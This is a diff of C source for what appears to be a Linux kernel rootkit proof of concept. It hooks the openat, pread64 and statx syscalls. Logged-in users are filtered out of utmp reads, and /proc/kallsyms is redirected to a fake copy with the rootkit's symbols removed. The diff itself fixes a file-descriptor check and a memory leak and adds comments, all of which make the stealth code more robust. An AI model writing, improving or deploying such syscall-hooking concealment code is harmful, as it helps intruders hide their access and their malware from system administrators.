@@ -7,17 +7,18 @@
 
 static int utmpfd = -1;
 
-/* !**can block file access by filtering in openat**
-   !**for more complex file filtering/hiding can be used to filter by file descriptors in statx**
+/*  !**can block file access by filtering in openat**
+    !**for more complex file filtering/hiding can be used to filter by file descriptors in statx**
+    !**Theoretically, open() hook should be implemented too just in case, this is a POC thus no need for that**
 
-   openat is a systemcall used to open files,
-   it returns the file descriptor that is opened for the process requested it,
-   it allows access to files relative to the directory it was called from,
-   it uses dirfd which is the file descriptor of the current dir, if the path is aboslute,
-   it ignores the dirfd. can create the file if not exists.
-   the hook was created to check if the utmp file(users logged in) is opened,
-   if it was, we save the file descriptor to later check in pread64 hook to filter the users.
-   if /proc/kallsyms is opened, updates and redirects to the fake file with removed refrences to rootkite ksyms
+    openat is a systemcall used to open files,
+    it returns the file descriptor that is opened for the process requested it,
+    it allows access to files relative to the directory it was called from,
+    it uses dirfd which is the file descriptor of the current dir, if the path is aboslute,
+    it ignores the dirfd. can create the file if not exists.
+    the hook was created to check if the utmp file(users logged in) is opened,
+    if it was, we save the file descriptor to later check in pread64 hook to filter the users.
+    if /proc/kallsyms is opened, updates and redirects to the fake file with removed refrences to rootkite ksyms
 */
 #ifdef PTREGS_SYSCALL_STUB
 static asmlinkage int hack_openat(struct pt_regs *regs){
@@ -49,7 +50,7 @@ static asmlinkage int hack_openat(struct pt_regs *regs){
     if(memcmp(kern_filename, kallsyms_path, kallsyms_path_len) == 0){
         hide_ksyms();
         strcpy(kern_filename, fake_kallsyms_path);
-        if(copy_to_user(filename, kern_filename, fake_kallsyms_path_len) != 0){
+        if(copy_to_user(filename, kern_filename, fake_kallsyms_path_len) != 0){ // switch to the fake copy of kallsyms
             kfree(kern_filename);
             return orig_openat(regs);
         }
@@ -66,7 +67,8 @@ static asmlinkage ssize_t hack_pread64(struct pt_regs *regs){
     unsigned int fd = regs->di; // the file descriptor that is being read from
     char *buf = (char *)regs->si; // the buffer contains the utmp struct from the file
     size_t count = regs->dx; // size of the buffer
-    if(fd == utmpfd && utmpfd != 0 && utmpfd != 1 && utmpfd != 2){ // check in case STDOUT, STDIN, STDERR were not opened
+
+    if(fd == utmpfd && utmpfd != 0 && utmpfd != 1 && utmpfd != 2){ // check in case STDOUT, STDIN, STDERR were not opened by mistake
         char *read_buff;
         struct utmp *utmp_s;
         ssize_t ret;
@@ -97,6 +99,7 @@ static asmlinkage ssize_t hack_pread64(struct pt_regs *regs){
             kfree(read_buff);
             return ret;
         }
+        kfree(read_buff);
     }
 
     return orig_pread64(regs);
@@ -113,6 +116,7 @@ static asmlinkage ssize_t hack_pread64(struct pt_regs *regs){
 static asmlinkage int hack_statx(struct pt_regs *regs){
     char * token;
     char *temp_filename = kmalloc(NAME_MAX + 1, GFP_KERNEL);
+
     if(temp_filename == NULL){
         return orig_statx(regs);
     }
@@ -171,7 +175,7 @@ static asmlinkage int hack_openat(int dfd, const char *filename, int flags, umod
 
 
 static asmlinkage ssize_t hack_pread64(unsigned int fd, char *buf, size_t count, loff_t pos){
-    if(fd == utmpfd && utmpfd != 1 && utmpfd != 2 && utmpfd != 3){
+    if(fd == utmpfd && utmpfd != 0 && utmpfd != 1 && utmpfd != 2){
         char *read_buff;
         struct utmp *utmp_s;
         ssize_t ret;
@@ -202,6 +206,7 @@ static asmlinkage ssize_t hack_pread64(unsigned int fd, char *buf, size_t count,
             kfree(read_buff);
             return ret;
         }
+        kfree(read_buff);
     }
     return orig_pread64(fd, buf, count, pos);
 }
